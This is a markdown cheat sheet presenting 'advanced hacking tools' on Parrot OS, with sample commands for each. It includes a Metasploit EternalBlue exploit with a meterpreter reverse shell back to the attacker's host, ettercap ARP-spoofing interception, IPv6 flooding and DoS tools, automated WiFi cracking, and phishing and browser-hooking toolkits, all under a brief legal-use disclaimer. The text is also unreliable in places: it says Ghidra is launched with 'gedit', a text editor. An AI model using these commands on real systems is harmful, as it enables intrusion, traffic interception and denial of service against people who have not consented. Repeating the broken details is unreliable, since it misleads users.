# 🔥 Advanced Hacking Tools on Parrot OS

## 🎯 Top-Tier Security Tools Available

### **🚀 Exploitation Frameworks**

#### 1. **Metasploit Framework** (`metasploit-framework`)
```bash
# Start Metasploit
msfconsole

# Common commands:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
exploit
```

#### 2. **Armitage** (Metasploit GUI)
```bash
# Start Armitage GUI
armitage
# Requires Metasploit to be running
```

### **🌐 Network Attack Tools**

#### 3. **Ettercap** (MITM Attacks)
```bash
# Graphical version
ettercap-graphical

# Command line MITM
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
```

#### 4. **Yersinia** (Layer 2 Attacks)
```bash
# Launch Yersinia
sudo yersinia -G

# DHCP attacks
yersinia -I  # Interactive mode
```

#### 5. **THC-IPv6** (IPv6 Attack Toolkit)
```bash
# Various IPv6 attack tools
sudo dos_new-ip6  # IPv6 DoS
sudo flood_router6  # Router flooding
```

### **🕸️ Web Application Testing**

#### 6. **Burp Suite Professional**
```bash
# Launch Burp Suite
burpsuite

# Features:
- Web vulnerability scanner
- Intruder for bruteforcing
- Repeater for manual testing
- Proxy for traffic interception
```

### **📶 Wireless Advanced Tools**

#### 7. **Kismet** (Wireless Detection)
```bash
# Install and run
sudo apt install kismet
sudo kismet

# Features:
- Wireless network detector
- Packet sniffer
- Intrusion detection
```

#### 8. **Wifite** (Automated Wireless Attacks)
```bash
# Automated attacks
sudo wifite

# Target specific network
sudo wifite --bssid AA:BB:CC:DD:EE:FF --channel 6
```

#### 9. **Fern WiFi Cracker**
```bash
# GUI wireless cracking
fern-wifi-cracker

# Features:
- WEP/WPA cracking
- Automatic attack sequences
- Session management
```

### **🔍 Forensics & Reverse Engineering**

#### 10. **Ghidra** (NSA Reverse Engineering)
```bash
# Launch Ghidra
gedit

# Features:
- Disassembler
- Decompiler
- Software analysis
```

#### 11. **Radare2** (Advanced RE Framework)
```bash
# Install and use
sudo apt install radare2
r2 /path/to/binary

# Common commands:
aaa  # Analyze all
pdf  # Disassemble function
```

#### 12. **OllyDbg** (Windows Debugger)
```bash
# Available for Windows binary analysis
# Use with Wine if needed
```

### **🎭 Social Engineering**

#### 13. **Social Engineering Toolkit (SET)**
```bash
# Launch SET
setoolkit

# Attack vectors:
- Spear phishing attacks
- Website cloning
- Infectious media
```

#### 14. **BeEF** (Browser Exploitation)
```bash
# Start BeEF
beef-xss

# Features:
- Hook browsers
- Execute commands
- Gather information
```

### **🔐 Password Attacks**

#### 15. **Hashcat** (GPU Password Cracking)
```bash
# GPU accelerated cracking
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Common modes:
-m 0  # MD5
-m 1000  # NTLM
-m 2500  # WPA/WPA2
```

#### 16. **John the Ripper**
```bash
# Password cracking
john --format=nt hashes.txt
john --wordlist=wordlist.txt hashes.txt
```

#### 17. **Crunch** (Wordlist Generator)
```bash
# Generate custom wordlists
crunch 8 12 -t password%%%  # 8-12 chars with pattern
crunch 6 6 0123456789 -o numbers.txt  # All 6-digit numbers
```

### **🕵️ OSINT Tools**

#### 18. **Recon-ng** (Web Reconnaissance)
```bash
# Launch Recon-ng
recon-ng

# Modules:
use recon/domains-hosts/google_site
use recon/domains-hosts/brute_hosts
```

#### 19. **TheHarvester** (Email/Domain OSINT)
```bash
# Gather information
theHarvester -d example.com -l 500 -b google
```

### **🌐 VPN & Anonymity**

#### 20. **Tor** (Anonymity Network)
```bash
# Start Tor service
sudo service tor start

# Use with applications
torsocks firefox  # Firefox through Tor
```

#### 21. **Proxychains**
```bash
# Route traffic through proxies
proxychains nmap -sT 192.168.1.1
```

#### 22. **Anonsurf** (Parrot Anonymization)
```bash
# System-wide anonymity
sudo anonsurf start
sudo anonsurf stop
```

## 📦 Installation Commands

```bash
# Install all available tools
sudo apt update
sudo apt install metasploit-framework armitage ettercap-graphical yersinia thc-ipv6
sudo apt install burpsuite kismet wifite fern-wifi-cracker ghidra radare2
sudo apt install setoolkit beef-xss hashcat john crunch recon-ng theharvester
sudo apt install tor proxychains anonsurf

# Or install meta-packages
sudo apt install parrot-tools-full  # All tools
sudo apt install parrot-tools-web    # Web tools only
sudo apt install parrot-tools-wireless  # Wireless tools
```

## 🚀 Quick Start Commands

```bash
# 1. Start Metasploit
msfconsole

# 2. Launch Armitage (Metasploit GUI)
armitage

# 3. Wireless attack with Wifite
sudo wifite

# 4. Web testing with Burp Suite
burpsuite

# 5. Password cracking with Hashcat
hashcat -m 2500 capture.hc22000 wordlist.txt

# 6. OSINT with Recon-ng
recon-ng
```

## ⚠️ Important Notes

- **Legal Use Only**: Only test systems you own or have permission to test
- **Ethical Hacking**: Follow responsible disclosure practices
- **Training**: Use in lab environments for skill development
- **Updates**: Keep tools updated with `sudo apt update && sudo apt upgrade`

## 🔧 Tool Categories

- **Red Team**: Metasploit, Armitage, Cobalt Strike
- **Blue Team**: Kismet, Security Onion, Wireshark  
- **Web**: Burp Suite, ZAP, W3AF
- **Wireless**: Aircrack-ng, Kismet, Wifite
- **Forensics**: Autopsy, Sleuthkit, Volatility
- **Password**: Hashcat, John, Crunch
- **OSINT**: Maltego, Spiderfoot, Recon-ng

This represents the most powerful hacking toolkit available on Parrot OS! 🚀